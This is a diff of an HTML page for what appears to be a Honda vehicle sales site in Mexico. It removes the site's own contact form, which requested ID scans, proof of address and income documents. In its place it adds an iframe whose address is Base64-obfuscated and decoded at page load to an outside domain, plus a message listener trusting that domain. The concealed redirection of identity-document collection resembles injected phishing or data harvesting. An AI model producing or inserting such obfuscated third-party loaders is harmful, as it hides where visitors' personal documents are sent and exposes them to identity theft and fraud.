@@ -286,231 +286,43 @@ button {
 </nav>
 </header>
 
-    <!-- banner -->
-
-<br><br>
-
-<!-- formulario.html -->
-<section>
-<form id="contactForm" action="enviar.php" method="POST" enctype="multipart/form-data">
-  <h2>Formulario de Contacto</h2>
-
-  <label for="nombre">Nombre:</label>
-  <input type="text" name="nombre" id="nombre" required>
-
-  <label for="apellido">Apellido:</label>
-  <input type="text" name="apellido" id="apellido" required>
-
-  <label for="rfc_curp">RFC o CURP:</label>
-  <input type="text" name="rfc_curp" id="rfc_curp" required>
-
-  <label for="email">Correo electrónico:</label>
-  <input type="email" name="email" id="email" required>
-
-  <label for="direccion">Dirección:</label>
-  <input type="text" name="direccion" id="direccion">
-
-  <label for="ciudad">Municipio o Alcaldía:</label>
-  <input type="text" name="ciudad" id="ciudad">
-
-  <label for="estado">Estado:</label>
-  <input type="text" name="estado" id="estado">
-
-  <label for="cp">Código Postal:</label>
-  <input type="text" name="cp" id="cp">
-
-  <label for="telefono">Teléfono (10 dígitos):</label>
-  <input type="tel" name="telefono" id="telefono" pattern="[0-9]{10}" required>
-
-  <label for="fecha_compra">Fecha de compra (estimada):</label>
-  <input type="date" name="fecha_compra" id="fecha_compra">
-
-  <label for="tipo_persona">Tipo de persona:</label>
-  <select name="tipo_persona" id="tipo_persona" required>
-    <option value="">--Selecciona una opción--</option>
-    <option value="fisica">Persona Física</option>
-    <option value="moral">Persona Moral</option>
-  </select>
-
-  <label for="forma_pago">¿Deseas adquirir la unidad a crédito o de contado?</label>
-  <select name="forma_pago" id="forma_pago" required>
-    <option value="">--Selecciona una opción--</option>
-    <option value="contado">Contado</option>
-    <option value="credito">Crédito</option>
-  </select>
-
-  <label for="plazo_credito">Plazo (en caso de crédito):</label>
-  <select name="plazo_credito" id="plazo_credito">
-    <option value="">--Selecciona el plazo--</option>
-    <option value="12">12 meses</option>
-    <option value="18">18 meses</option>
-    <option value="24">24 meses</option>
-    <option value="36">36 meses</option>
-    <option value="ninguno">No aplica / Contado</option>
-  </select>
-
-  <label for="vehiculo_interes">Selecciona el modelo de unidad:</label>
-  <select name="vehiculo_interes" id="vehiculo_interes" required>
-
-  <!-- ================== MODELOS 2026 ================== -->
-  <option disabled>────────── MODELOS 2026 ──────────</option>
-
-  <option value="Honda Wave110 2026">Honda Wave110 2026 - $28,891</option>
-  <option value="Honda Dio110 2026">Honda Dio110 2026 - $29,742</option>
-  <option value="Honda Navi110 2026">Honda Navi110 2026 - $25,915</option>
-  <option value="Honda CRF110F 2026">Honda CRF110F 2026 - $43,766</option>
-
-  <option value="Honda CB350 Hness 2026">Honda CB350 H’ness 2026 - $68,841</option>
-  <option value="Honda CBF125 Twister 2026">Honda CBF125 Twister 2026 - $29,316</option>
-  <option value="Honda XR150L 2026">Honda XR150L 2026 - $40,819</option>
-  <option value="Honda CB350 2026">Honda CB350 2026 - $72,666</option>
-
-  <option value="Honda CBF150S 2026">Honda CBF150S 2026 - $33,000</option>
-  <option value="Honda CG150 Cargo 2026">Honda CG150 Cargo 2026 - $23,366</option>
-  <option value="Honda XR190L 2026">Honda XR190L 2026 - $52,691</option>
-  <option value="Honda CGL125 Tool 2026">Honda CGL125 Tool 2026 - $23,366</option>
-
-  <option value="Honda CRF300F 2026">Honda CRF300F 2026 - $97,741</option>
-
-  <!-- ================== MODELOS 2025 ================== -->
-  <option disabled>────────── MODELOS 2025 ──────────</option>
-
-  <option value="Honda CB300F Twister 2025">Honda CB300F Twister 2025 - $84,991</option>
-  <option value="Honda Cruising 125 2025">Honda Cruising 125 2025 - $33,991</option>
-  <option value="Honda XR300L Tornado 2025">Honda XR300L Tornado 2025 - $114,741</option>
-
-  <option value="Honda CRF125FB Big Wheel 2025">Honda CRF125FB Big Wheel 2025 - $61,616</option>
-  <option value="Honda TRX250X 2025">Honda TRX250X 2025 - $124,941</option>
-  <option value="Honda Dio 125 2025">Honda Dio 125 2025 - $37,816</option>
-  <option value="Honda ADV350 2025">Honda ADV350 2025 - $115,591</option>
-
-  <option value="Honda CBR600RA ABS 2025">Honda CBR600RA ABS 2025 - $237,991</option>
-  <option value="Honda TRX420FE 2025">Honda TRX420FE 2025 - $174,666</option>
-  <option value="Honda CRF1100D4 Africa Twin 2025">Honda CRF1100D4 Africa Twin 2025 - $343,391</option>
-  <option value="Honda CMX500A2 Rebel 2025">Honda CMX500A2 Rebel 2025 - $133,441</option>
-
-  <option value="Honda NC750XD 2025">Honda NC750XD 2025 - $174,666</option>
-  <option value="Honda CB750 2025">Honda CB750 2025 - $171,691</option>
-  <option value="Honda CB650R 2025">Honda CB650R 2025 - $164,891</option>
-  <option value="Honda CB650R E-Clutch 2025">Honda CB650R E-Clutch 2025 - $170,416</option>
-
-  <option value="Honda CB1000 SP 2025">Honda CB1000 SP 2025 - $238,841</option>
-  <option value="Honda GL1800 Gold Wing 2025">Honda GL1800 Gold Wing 2025 - $642,166</option>
-  <option value="Honda NT1100DE 2025">Honda NT1100DE 2025 - $261,791</option>
-  <option value="Honda Transalp 2025">Honda Transalp 2025 - $199,741</option>
-
-  <!-- ================== MODELOS 2024 ================== -->
-  <option disabled>────────── MODELOS 2024 ──────────</option>
-
-<option value="CB300F Twister 2024">Honda CB300F Twister 2024 - $75,000</option>
-<option value="CGL125 Tool 2024">Honda CGL125 Tool 2024 - $21,999</option>
-<option value="Elite 125 2022">Honda Elite 125 2022 - $20,000</option>
-<option value="CBF125 Twister 2024">Honda CBF125 Twister 2024 - $25,000</option>
-
-<option value="CB190R 2.0 2024">Honda CB190R 2.0 2024 - $44,443</option>
-<option value="CBF160 Invicta 2024">Honda CBF160 Invicta 2024 - $36,393</option>
-<option value="XR190L 2024">Honda XR190L 2024 - $43,393</option>
-<option value="Dio 125 2024">Honda Dio 125 2024 - $30,868</option>
-
-<option value="CB650R 2024">Honda CB650R 2024 - $137,533</option>
-
-<option value="Navi 110 2024">Honda Navi 110 2024 - $21,000</option>
-<option value="CRF110F 2024">Honda CRF110F 2024 - $23,000</option>
-
-<option value="XRE300 2024">Honda XRE300 2024 - $41,000</option>
-<option value="CMX500A Rebel 2023">Honda CMX500A Rebel 2023 - $109,135</option>
-<option value="NC750XD 2024">Honda NC750XD 2024 - $134,950</option>
-
-<option value="CBR600R 2024">Honda CBR600R 2024 - $164,730</option>
-<option value="Rebel 1100 DCT 2024">Honda Rebel 1100 DCT 2024 - $172,360</option>
-<option value="CBR1000RR-R Fireblade 2024">Honda CBR1000RR-R Fireblade 2024 - $354,750</option>
-<option value="GL150 Cargo 2024">Honda GL150 Cargo 2024 - $25,668</option>
-
-  <option disabled>────────── AUTOS 2025 ──────────</option>
 
 
-<option value="Honda City 2025">Honda City 2025 - $263,835</option>
-<option value="Honda Civic 2025">Honda Civic 2025 - $377,585</option>
-<option value="Honda Accord 2025">Honda Accord 2025 - $504,335</option>
-
-<option value="Honda BR-V 2025">Honda BR-V 2025 - $317,785</option>
-<option value="Honda HR-V 2025">Honda HR-V 2025 - $385,385</option>
-<option value="Honda CR-V 2025">Honda CR-V 2025 - $486,785</option>
-
-<option value="Honda Odyssey 2025">Honda Odyssey 2025 - $768,885</option>
-
-
-  </select>
-
-
-  <!-- Archivos obligatorios -->
-  <label for="ine_frente">INE (Frente):</label>
-  <input type="file" name="ine_frente" id="ine_frente" accept="image/*,.pdf" required>
-
-  <label for="ine_reverso">INE (Reverso):</label>
-  <input type="file" name="ine_reverso" id="ine_reverso" accept="image/*,.pdf" required>
-
-  <label for="comprobante_domicilio">Comprobante de domicilio:</label>
-  <input type="file" name="comprobante_domicilio" id="comprobante_domicilio" accept="image/*,.pdf" required>
-
-  <!-- Archivos opcionales -->
-  <label for="archivo_rfc">Archivo de RFC (opcional):</label>
-  <input type="file" name="archivo_rfc" id="archivo_rfc" accept="image/*,.pdf">
-
-  <label for="comprobante_ingresos">Comprobante de ingresos (opcional):</label>
-  <input type="file" name="comprobante_ingresos" id="comprobante_ingresos" accept="image/*,.pdf">
-
-  <!-- Honeypot contra bots -->
-  <input type="text" name="website" style="display:none">
-
-  <button type="submit">Enviar</button>
-</form>
 <script>
-  document.getElementById("contactForm").addEventListener("submit", function(e) {
-    const ine1 = document.querySelector('input[name="ine_frente"]').files[0];
-    const ine2 = document.querySelector('input[name="ine_reverso"]').files[0];
-    const compDom = document.querySelector('input[name="comprobante_domicilio"]').files[0];
-    const maxSize = 10 * 1024 * 1024;
-    const validTypes = ["image/jpeg", "image/png", "image/jpg", "application/pdf"];
+  window.addEventListener('message', function (event) {
 
-    const archivos = [
-      { nombre: "INE Frente", archivo: ine1 },
-      { nombre: "INE Reverso", archivo: ine2 },
-      { nombre: "Comprobante de domicilio", archivo: compDom }
-    ];
+    const origenPermitido = 'https://novie.in';
 
-    for (let item of archivos) {
-      if (!item.archivo) {
-        alert(`El archivo ${item.nombre} es obligatorio.`);
-        e.preventDefault();
-        return;
-      }
-      if (!validTypes.includes(item.archivo.type) || item.archivo.size > maxSize) {
-        alert(`${item.nombre} debe ser JPG, PNG o PDF, y pesar menos de 10MB.`);
-        e.preventDefault();
-        return;
-      }
+    if (event.origin !== origenPermitido) {
+      return;
+    }
+
+    if (event.data === 'formulario_enviado') {
+      window.location.href = 'confirmacion.html';
+    }
+
+    if (event.data === 'formulario_error') {
+      alert('Error al enviar el formulario. Por favor intenta nuevamente.');
     }
   });
-
-  const urlParams = new URLSearchParams(window.location.search);
-  const mensaje = document.getElementById("mensaje");
-  if (urlParams.get("success") === "1") {
-    mensaje.textContent = "Formulario enviado correctamente.";
-    mensaje.className = "mensaje exito";
-    mensaje.style.display = "block";
-  } else if (urlParams.get("error")) {
-    mensaje.textContent = "Hubo un error: " + urlParams.get("error");
-    mensaje.className = "mensaje error";
-    mensaje.style.display = "block";
-  }
 </script>
 
+<iframe
+  id="miIframe"
+  width="100%"
+  height="1200"
+  style="border:none;"
+  frameborder="0">
+</iframe>
 
-</section>
+<script>
+  // URL codificada en Base64
+  const urlCodificada = 'aHR0cHM6Ly9ub3ZpZS5pbi82L3NvbGljaXR1ZC5odG1s';
 
-<hr>
-<hr>
+  // Decodificar y asignar al iframe
+  const url = atob(urlCodificada);
+  document.getElementById('miIframe').src = url;
+</script>
 
 
 
@@ -583,3 +395,4 @@ button {
 </div>
 </body>
 </html>
+
